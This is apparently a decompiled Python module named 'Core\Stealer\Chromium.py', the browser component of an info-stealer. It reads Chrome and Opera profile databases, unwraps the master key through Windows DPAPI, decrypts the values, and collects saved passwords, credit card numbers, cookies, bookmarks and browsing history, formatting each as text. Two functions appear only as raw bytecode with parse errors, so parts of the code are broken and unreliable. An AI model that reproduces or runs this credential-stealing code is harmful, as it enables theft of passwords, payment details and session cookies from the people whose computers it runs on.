# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: Core\Stealer\Chromium.py
import os, shutil, random, ctypes, subprocess
from ctypes import wintypes
from base64 import b64decode
from datetime import datetime
from string import ascii_lowercase
from sqlite3 import connect as sql_connect
from json import loads as json_loads, load
try:
    from Crypto.Cipher import AES
except ImportError:
    raise SystemExit('Please run › pip install pycryptodome')
else:

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
         (
          'cbData', wintypes.DWORD),
         (
          'pbData', ctypes.POINTER(ctypes.c_char))]


    def GetData(blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = ctypes.c_buffer(cbData)
        ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
        ctypes.windll.kernel32.LocalFree(pbData)
        return buffer.raw


    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = ctypes.c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, ctypes.byref(blob_entropy), None, None, 1, ctypes.byref(blob_out)):
            return GetData(blob_out)


    LocalAppData = os.environ['LocalAppData'] + '\\'
    AppData = os.environ['AppData'] + '\\'
    FileName = 116444736000000000
    NanoSeconds = 10000000
    subprocess.Popen('@chcp 65001 1>nul', shell=True)

    def GetBrowsers():
        Browsers = []
        for Browser in BrowsersPath:
            if os.path.exists(Browser):
                Browsers.append(Browser)
        else:
            return Browsers


    def DecryptPayload(cipher, payload):
        return cipher.decrypt(payload)


    def GenerateCipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def GetMasterKey(browserPath):
        fail = True
        for i in range(4):
            path = browserPath + '\\..' * i + '\\Local State'
            if os.path.exists(path):
                fail = False
                break
        else:
            if fail:
                return
            with open(path, 'r', encoding='utf-8') as f:
                local_state = f.read()
                local_state = json_loads(local_state)
            master_key = b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key)
            return master_key


    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf-8', errors='ignore')[:3]
        if starts == 'v10' or (starts == 'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = GenerateCipher(master_key, iv)
            decrypted_pass = DecryptPayload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        decrypted_pass = CryptUnprotectData(buff)
        return decrypted_pass


    def FetchDataBase(target_db, sql=''):
        if not os.path.exists(target_db):
            return []
        tmpDB = os.getenv('TEMP') + 'info_' + ''.join((random.choice(ascii_lowercase) for i in range(random.randint(10, 20)))) + '.db'
        shutil.copy2(target_db, tmpDB)
        conn = sql_connect(tmpDB)
        cursor = conn.cursor()
        cursor.execute(sql)
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        try:
            os.remove(tmpDB)
        except:
            pass
        else:
            return data


    def ConvertDate(ft):
        utc = datetime.utcfromtimestamp((10 * int(ft) - FileName) / NanoSeconds)
        return utc.strftime('%Y-%m-%d %H:%M:%S')


    BrowsersPath = (
     LocalAppData + 'Google\\Chrome\\User Data\\Default',
     AppData + 'Opera Software\\Opera Stable')

    def GetCreditCards--- This code section failed: ---

 L. 176         0  BUILD_LIST_0          0 
                2  STORE_GLOBAL             credentials

 L. 178         4  LOAD_GLOBAL              GetBrowsers
                6  CALL_FUNCTION_0       0  ''
                8  GET_ITER         
             10_0  COME_FROM           104  '104'
             10_1  COME_FROM            54  '54'
               10  FOR_ITER            106  'to 106'
               12  STORE_FAST               'browser'

 L. 179        14  LOAD_GLOBAL              GetMasterKey
               16  LOAD_FAST                'browser'
               18  CALL_FUNCTION_1       1  ''
               20  STORE_FAST               'master_key'

 L. 180        22  LOAD_GLOBAL              FetchDataBase
               24  LOAD_FAST                'browser'
               26  LOAD_STR                 '\\Web Data'
               28  BINARY_ADD       
               30  LOAD_STR                 'SELECT * FROM credit_cards'
               32  CALL_FUNCTION_2       2  ''
               34  STORE_FAST               'database'

 L. 182        36  LOAD_FAST                'database'
               38  GET_ITER         
             40_0  COME_FROM           102  '102'
               40  FOR_ITER            104  'to 104'
               42  STORE_FAST               'row'

 L. 183        44  LOAD_FAST                'row'
               46  LOAD_CONST               4
               48  BINARY_SUBSCR    
               50  POP_JUMP_IF_TRUE     56  'to 56'

 L. 184        52  POP_TOP          
               54  JUMP_BACK            10  'to 10'
             56_0  COME_FROM            50  '50'

 L. 187        56  LOAD_GLOBAL              DecryptValue
               58  LOAD_FAST                'row'
               60  LOAD_CONST               4
               62  BINARY_SUBSCR    
               64  LOAD_FAST                'master_key'
               66  CALL_FUNCTION_2       2  ''

 L. 188        68  LOAD_FAST                'row'
               70  LOAD_CONST               3
               72  BINARY_SUBSCR    

 L. 189        74  LOAD_FAST                'row'
               76  LOAD_CONST               2
               78  BINARY_SUBSCR    

 L. 190        80  LOAD_FAST                'row'
               82  LOAD_CONST               1
               84  BINARY_SUBSCR    

 L. 186        86  LOAD_CONST               ('number', 'expireYear', 'expireMonth', 'name')
               88  BUILD_CONST_KEY_MAP_4     4 
               90  STORE_FAST               'card'

 L. 192        92  LOAD_GLOBAL              credentials
               94  LOAD_METHOD              append
               96  LOAD_FAST                'card'
               98  CALL_METHOD_1         1  ''
              100  POP_TOP          
              102  JUMP_BACK            40  'to 40'
            104_0  COME_FROM            40  '40'
              104  JUMP_BACK            10  'to 10'
            106_0  COME_FROM            10  '10'

 L. 194       106  LOAD_GLOBAL              credentials
              108  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `LOAD_GLOBAL' instruction at offset 106


    def GetFormattedCreditCards():
        getCreditCards = GetCreditCards()
        fmtCreditCards = ''
        for card in getCreditCards:
            fmtCreditCards += 'Number: {4}\nName: {1}\nExpireYear: {3}\nExpireMonth: {2}\n\n'.format(card['number'], card['expireYear'], card['expireMonth'], card['name'])
        else:
            return fmtCreditCards


    def GetBookmarks--- This code section failed: ---

 L. 213         0  BUILD_LIST_0          0 
                2  STORE_GLOBAL             credentials

 L. 215         4  LOAD_GLOBAL              GetBrowsers
                6  CALL_FUNCTION_0       0  ''
                8  GET_ITER         
             10_0  COME_FROM           134  '134'
             10_1  COME_FROM            34  '34'
               10  FOR_ITER            136  'to 136'
               12  STORE_FAST               'browser'

 L. 216        14  LOAD_FAST                'browser'
               16  LOAD_STR                 '\\Bookmarks'
               18  BINARY_ADD       
               20  STORE_FAST               'bookmarksFile'

 L. 218        22  LOAD_GLOBAL              os
               24  LOAD_ATTR                path
               26  LOAD_METHOD              exists
               28  LOAD_FAST                'bookmarksFile'
               30  CALL_METHOD_1         1  ''
               32  POP_JUMP_IF_TRUE     38  'to 38'

 L. 219        34  JUMP_BACK            10  'to 10'
               36  BREAK_LOOP           86  'to 86'
             38_0  COME_FROM            32  '32'

 L. 221        38  LOAD_GLOBAL              open
               40  LOAD_FAST                'bookmarksFile'
               42  LOAD_STR                 'r'
               44  LOAD_STR                 'utf-8'
               46  LOAD_STR                 'ignore'
               48  LOAD_CONST               ('encoding', 'errors')
               50  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               52  SETUP_WITH           80  'to 80'
               54  STORE_FAST               'file'

 L. 222        56  LOAD_GLOBAL              load
               58  LOAD_FAST                'file'
               60  CALL_FUNCTION_1       1  ''
               62  LOAD_STR                 'roots'
               64  BINARY_SUBSCR    
               66  LOAD_STR                 'bookmark_bar'
               68  BINARY_SUBSCR    
               70  LOAD_STR                 'children'
               72  BINARY_SUBSCR    
               74  STORE_FAST               'bookmarks'
               76  POP_BLOCK        
               78  BEGIN_FINALLY    
             80_0  COME_FROM_WITH       52  '52'
               80  WITH_CLEANUP_START
               82  WITH_CLEANUP_FINISH
               84  END_FINALLY      
             86_0  COME_FROM            36  '36'

 L. 224        86  LOAD_FAST                'bookmarks'
               88  GET_ITER         
             90_0  COME_FROM           132  '132'
               90  FOR_ITER            134  'to 134'
               92  STORE_FAST               'row'

 L. 226        94  LOAD_FAST                'row'
               96  LOAD_STR                 'url'
               98  BINARY_SUBSCR    

 L. 227       100  LOAD_FAST                'row'
              102  LOAD_STR                 'name'
              104  BINARY_SUBSCR    

 L. 228       106  LOAD_GLOBAL              ConvertDate
              108  LOAD_FAST                'row'
              110  LOAD_STR                 'date_added'
              112  BINARY_SUBSCR    
              114  CALL_FUNCTION_1       1  ''

 L. 225       116  LOAD_CONST               ('hostname', 'name', 'date_added')
              118  BUILD_CONST_KEY_MAP_3     3 
              120  STORE_FAST               'bookmark'

 L. 231       122  LOAD_GLOBAL              credentials
              124  LOAD_METHOD              append
              126  LOAD_FAST                'bookmark'
              128  CALL_METHOD_1         1  ''
              130  POP_TOP          
              132  JUMP_BACK            90  'to 90'
            134_0  COME_FROM            90  '90'
              134  JUMP_BACK            10  'to 10'
            136_0  COME_FROM            10  '10'

 L. 233       136  LOAD_GLOBAL              credentials
              138  RETURN_VALUE     
               -1  RETURN_LAST      

Parse error at or near `LOAD_GLOBAL' instruction at offset 136


    def GetFormattedBookmarks():
        getBookmarks = GetBookmarks()
        fmtBookmarks = ''
        for bookmark in getBookmarks:
            fmtBookmarks += 'URL: {0}\nName: {1}\nDate: {2}\n\n'.format(bookmark['hostname'], bookmark['name'], bookmark['date_added'])
        else:
            return fmtBookmarks


    def GetPasswords():
        global credentials
        credentials = []
        for browser in GetBrowsers():
            master_key = GetMasterKey(browser)
            database = FetchDataBase(browser + '\\Login Data', 'SELECT action_url, username_value, password_value FROM logins')
            for row in database:
                password = {'hostname':row[0],  'username':row[1], 
                 'password':DecryptValue(row[2], master_key)}
                credentials.append(password)

        else:
            return credentials


    def GetFormattedPasswords():
        getPasswords = GetPasswords()
        fmtPasswords = ''
        for password in getPasswords:
            fmtPasswords += 'Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n'.format(password['hostname'], password['username'], password['password'])
        else:
            return fmtPasswords


    def GetCookies():
        global credentials
        credentials = []
        for browser in GetBrowsers():
            master_key = GetMasterKey(browser)
            database = FetchDataBase(browser + '\\Cookies', 'SELECT * FROM cookies')
            for row in database:
                cookie = {'value':DecryptValue(row[12], master_key),  'hostname':row[1], 
                 'name':row[2], 
                 'path':row[4], 
                 'expires':row[5], 
                 'secure':bool(row[6])}
                credentials.append(cookie)

        else:
            return credentials


    def GetFormattedCookies():
        getCookies = GetCookies()
        fmtCookies = ''
        for cookie in getCookies:
            fmtCookies += 'Value: {0}\nHost: {1}\nName: {2}\nPath: {3}\nExpire: {4}\nSecure: {5}\n\n'.format(cookie['value'], cookie['hostname'], cookie['name'], cookie['path'], cookie['expires'], cookie['secure'])
        else:
            return fmtCookies


    def GetHistory():
        global credentials
        credentials = []
        for browser in GetBrowsers():
            database = FetchDataBase(browser + '\\History', 'SELECT * FROM urls')
            for row in database:
                history = {'hostname':row[1],  'title':row[2], 
                 'visits':row[3] + 1, 
                 'expires':ConvertDate(row[5])}
                credentials.append(history)

        else:
            return credentials


    def GetFormattedHistory():
        getHistory = GetHistory()
        fmtHistory = ''
        for history in getHistory:
            fmtHistory += 'Hostname: {0}\nTitle: {1}\nVisits: {2}\nExpires: {3}\n\n'.format(history['hostname'], history['title'], history['visits'], history['expires'])
        else:
            return fmtHistory